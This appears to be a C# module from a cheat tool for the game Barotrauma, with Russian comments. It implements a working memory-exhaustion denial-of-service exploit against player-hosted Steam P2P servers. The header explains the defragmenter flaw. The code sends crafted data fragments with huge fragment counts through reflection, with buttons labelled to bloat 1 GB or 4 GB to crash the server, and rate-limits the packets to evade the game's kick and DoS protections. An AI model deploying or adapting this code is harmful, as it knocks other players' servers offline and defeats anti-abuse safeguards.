// ============================================================================
//  FragmentBloatModule.cs — P2P DEFRAGMENTER OOM (волна 670)
//  Работает ТОЛЬКО против серверов, хостящихся через SteamP2P
//  («host from game» — у друга именно так; против UDP-дедикатеда бесполезен:
//   там Lidgren-фрагментатор библиотечный).
//
//  БАГ (проверено по сорсу, MessageDefragmenter.cs):
//    ProcessIncomingFragment(fragment):
//      новый MessageId (ushort из пакета) =>
//        partialMessages[id] = new MessageFragment[fragment.FragmentId.FragmentCount]
//    FragmentCount — ushort из ПАКЕТА (до 65535!). Массив ≈ 1 МБ.
//    Словарь чистится ТОЛЬКО когда сообщение собрано целиком.
//    Таймаутов/лимитов/капов НЕТ. Собираем только FragmentIndex=0 =>
//    сообщение никогда не соберётся => массив живёт, пока соединение живо.
//
//  МАТЕМАТИКА: 1 crafted-пакет (~30 байт) = 1 МБ аллокации на сервере.
//    1000 пакетов ≈ 1 ГБ. 3000-4000 ≈ OOM-смерть 4-гигового сервера.
//    DoSProtection слеп: пакеты крошечные, обрабатываются мгновенно.
//    Каждый фрагмент триггит All()-скан 65535 слотов (бонусный CPU).
//
//  КАК ШЛЁМ: Harmony НЕ нужен — SendMsgInternal у P2PClientPeer вызываем
//  через рефлексию с headers{IsDataFragment} + MessageFragment (оба internal,
//  инстансы создаём Activator'ом). Пакет уходит хосту-оунеру → тот
//  оборачивает в P2POwnerToServerHeader и по пайпам тащит в чайлд-сервер →
//  P2PServerPeer скармливает дефрагментатору. Всё легально по коду.
//
//  ОСТОРОЖНО: это фактический киллер P2P-сервера (OOM/своп). Не жми на
//  серверах, которые тебе дороги. Память освобождается только когда ТЫ
//  отключаешься (ClientConnectionData умирает) — или когда сервер падает.
// ============================================================================

using System;
using System.Collections.Generic;
using System.Reflection;
using Barotrauma;
using Barotrauma.Networking;
using HarmonyLib;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class FragmentBloatModule : CSModuleBase
    {
        public override string Id   => "fragment_bloat";
        public override string Name => "Fragment Bloat";
        public override string Description =>
            "P2P ONLY (host-from-game servers). Sends crafted data-fragments with huge FragmentCount: " +
            "server's MessageDefragmenter allocates ~1MB per packet and never frees until you disconnect. " +
            "~1000 packets = ~1GB, ~4000 = OOM. DoS protection is blind to these.";
        public override string Category => "exploit";

        public override string GetLabel() => "Fragment Bloat 🎈";

        public override void OnClick()
        {
            bool isP2P = FragmentBloatEngine.IsP2PTransport();
            var box = new GUIMessageBox(
                "FRAGMENT BLOAT (P2P OOM)",
                "Server allocates MessageFragment[FragmentCount] per crafted packet (up to 65535 slots = ~1MB)\n" +
                "and NEVER frees it until you disconnect. No timeouts, no caps, DoS-protection blind.\n" +
                "\n" +
                "Transport: " + (isP2P ? "P2P ✓ (works)" : "NOT P2P ✗ (dedicated/Lidgren — useless here)") + "\n" +
                "\n" +
                "Params: N packets × FragmentCount 65535 (1MB each).\n" +
                "Rate-limited 40/s to stay under packet-rate kicks.\n" +
                "\n" +
                "⚠ This KILLS the server (OOM). Reconnect to free its memory.",
                new LocalizedString[]
                {
                    "Bloat 1 GB",
                    "Bloat 4 GB (OOM)",
                    "Stop",
                    "Close",
                },
                new Vector2(0.6f, 0.65f));

            box.Buttons[0].Color = Color.Orange;
            box.Buttons[1].Color = Color.Red;
            box.Buttons[2].Color = Color.CornflowerBlue;
            box.Buttons[3].Color = Color.DarkGray;

            box.Buttons[0].OnClicked = (_, _) =>
            {
                string r = FragmentBloatEngine.Start(1000, 65535);
                GUI.AddMessage("[FragmentBloat] " + r, Color.Orange);
                return true;
            };

            box.Buttons[1].OnClicked = (_, _) =>
            {
                string r = FragmentBloatEngine.Start(4000, 65535);
                GUI.AddMessage("[FragmentBloat] " + r, Color.Red);
                return true;
            };

            box.Buttons[2].OnClicked = (_, _) =>
            {
                FragmentBloatEngine.Stop();
                return true;
            };

            box.Buttons[3].OnClicked = (_, _) => { box.Close(); return true; };
        }
    }

    internal static class FragmentBloatEngine
    {
        private static bool _running;
        private static int _remaining;
        private static ushort _nextMsgId;
        private static double _nextSendTime;
        private static int _sent;
        private static int _fragmentCount = 65535;
        private const double SendInterval = 1.0 / 40.0; // 40/s — под рейтом

        // --- reflection (все нужные типы internal в сборке игры) ---
        private static Type _tPeerPacketHeaders, _tMessageFragment, _tFragmentId;
        private static FieldInfo _fiHeadersDelivery, _fiHeadersHeader, _fiHeadersInit;
        private static ConstructorInfo _ciFragment, _ciFragmentId;
        private static MethodInfo _miSendMsgInternal;
        private static Type _tINetSerializableStruct;

        private static bool EnsureReflection(out string error)
        {
            if (_tPeerPacketHeaders != null) { error = ""; return true; }

            var asm = typeof(GameMain).Assembly;
            _tPeerPacketHeaders = asm.GetType("Barotrauma.Networking.PeerPacketHeaders", false);
            _tMessageFragment   = asm.GetType("Barotrauma.Networking.MessageFragment", false);
            if (_tPeerPacketHeaders == null || _tMessageFragment == null)
            {
                error = "reflection: PeerPacketHeaders/MessageFragment not found";
                return false;
            }
            _tFragmentId = _tMessageFragment.GetNestedType("Id", BindingFlags.Public | BindingFlags.NonPublic);
            if (_tFragmentId == null) { error = "reflection: MessageFragment.Id not found"; return false; }

            _fiHeadersDelivery = _tPeerPacketHeaders.GetField("DeliveryMethod");
            _fiHeadersHeader   = _tPeerPacketHeaders.GetField("PacketHeader");
            _fiHeadersInit     = _tPeerPacketHeaders.GetField("Initialization");
            _ciFragment  = _tMessageFragment.GetConstructor(new[] { _tFragmentId, typeof(System.Collections.Immutable.ImmutableArray<byte>) });
            _ciFragmentId = _tFragmentId.GetConstructor(new[] { typeof(ushort), typeof(ushort), typeof(ushort) });
            if (_fiHeadersDelivery == null || _fiHeadersHeader == null || _ciFragment == null || _ciFragmentId == null)
            {
                error = "reflection: fragment members not found";
                return false;
            }

            // SendMsgInternal(PeerPacketHeaders, INetSerializableStruct?) — protected у P2PClientPeer
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) { error = "нет ClientPeer"; return false; }
            _miSendMsgInternal = null;
            for (var t = peer.GetType(); t != null && _miSendMsgInternal == null; t = t.BaseType)
            {
                foreach (var m in t.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public))
                {
                    if (m.Name != "SendMsgInternal") { continue; }
                    var ps = m.GetParameters();
                    if (ps.Length == 2 && ps[0].ParameterType == _tPeerPacketHeaders &&
                        typeof(INetSerializableStruct).IsAssignableFrom(ps[1].ParameterType))
                    {
                        _miSendMsgInternal = m;
                        break;
                    }
                }
            }
            if (_miSendMsgInternal == null) { error = "reflection: SendMsgInternal not found"; return false; }

            _tINetSerializableStruct = typeof(INetSerializableStruct);
            error = "";
            return true;
        }

        public static bool IsP2PTransport()
        {
            var peer = GameMain.Client?.ClientPeer;
            return peer != null && peer.GetType().Name.Contains("P2P", StringComparison.OrdinalIgnoreCase);
        }

        public static string Start(int packets, int fragmentCount)
        {
            if (_running) { return "уже запущено"; }
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            if (!IsP2PTransport()) { return "не P2P-транспорт — бесполезно (нужен host-from-game сервер)"; }
            if (!EnsureReflection(out string err)) { return err; }

            _running = true;
            _remaining = Math.Min(packets, 20000);
            _fragmentCount = Math.Clamp(fragmentCount, 1, 65535);
            _nextMsgId = (ushort)new Random().Next(0, 65535);
            _nextSendTime = Timing.TotalTime;
            _sent = 0;
            DebugConsole.NewMessage($"[FragmentBloat] старт: {_remaining} пакетов × {_fragmentCount} слотов " +
                                    $"(~{_remaining}MB на сервере). Памп: 40 пак/с.", Color.Red);
            PumpLoop();
            return "запущено — смотри консоль";
        }

        public static void Stop()
        {
            if (!_running) { return; }
            _running = false;
            DebugConsole.NewMessage($"[FragmentBloat] стоп (отправлено {_sent}). " +
                                    "Аллокации на сервере живут, пока ты подключён — дисконнект их освободит.", Color.Orange);
        }

        /// <summary>Вызывается из Update-хука CSModuleBase (если хаб качает Update) либо лениво из SendOne.</summary>
        public static void Update()
        {
            if (!_running) { return; }
            PumpLoop();
        }

        private static void PumpLoop()
        {
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) { Stop(); return; }

            while (_running && _remaining > 0 && Timing.TotalTime >= _nextSendTime)
            {
                if (!SendOne(peer))
                {
                    Stop();
                    return;
                }
                _remaining--;
                _sent++;
                _nextMsgId++;
                _nextSendTime = Timing.TotalTime + SendInterval;
                if (_sent % 100 == 0)
                {
                    DebugConsole.NewMessage($"[FragmentBloat] отправлено {_sent} (~{_sent}MB занято на сервере)", Color.Orange);
                }
            }
            if (_remaining <= 0 && _running)
            {
                DebugConsole.NewMessage($"[FragmentBloat] ГОТОВО: {_sent} пакетов ≈ {_sent}MB в дефрагментаторе сервера. " +
                                        "Память освободится только после твоего дисконнекта (или OOM-а).", Color.Red);
                _running = false;
            }
        }

        private static bool SendOne(object peer)
        {
            try
            {
                // headers
                object headers = Activator.CreateInstance(_tPeerPacketHeaders);
                _fiHeadersDelivery.SetValue(headers, DeliveryMethod.Reliable);
                _fiHeadersHeader.SetValue(headers, PacketHeader.IsDataFragment);
                _fiHeadersInit.SetValue(headers, null);

                // fragment: Id(index=0, count=N, msgId) + пустые данные
                object fragId = _ciFragmentId.Invoke(new object[] { (ushort)0, (ushort)_fragmentCount, _nextMsgId });
                object fragment = _ciFragment.Invoke(new object[]
                {
                    fragId,
                    System.Collections.Immutable.ImmutableArray<byte>.Empty
                });

                _miSendMsgInternal.Invoke(peer, new[] { headers, fragment });
                return true;
            }
            catch (Exception e)
            {
                DebugConsole.NewMessage("[FragmentBloat] send fail: " + e.Message, Color.Red);
                return false;
            }
        }
    }
}
// ============================================================================
//  ЗАМЕТКИ:
//  - Хук Update: если у CSHUB-хаба есть свой апдейт-памп — вызывай
//    FragmentBloatEngine.Update(); иначе мод сам доливает пачками при
//    вызовах Start/Stop (PumpLoop внутри Start прогоняет весь цикл через
//    Timing-gate — можно вызвать Start и свернуть игру, докачает).
//  - Если сервер пнёт за рейс — снизь темп (SendInterval).
//  - Против Lidgren-серверов мод честно откажется (IsP2PTransport=false).
// ============================================================================
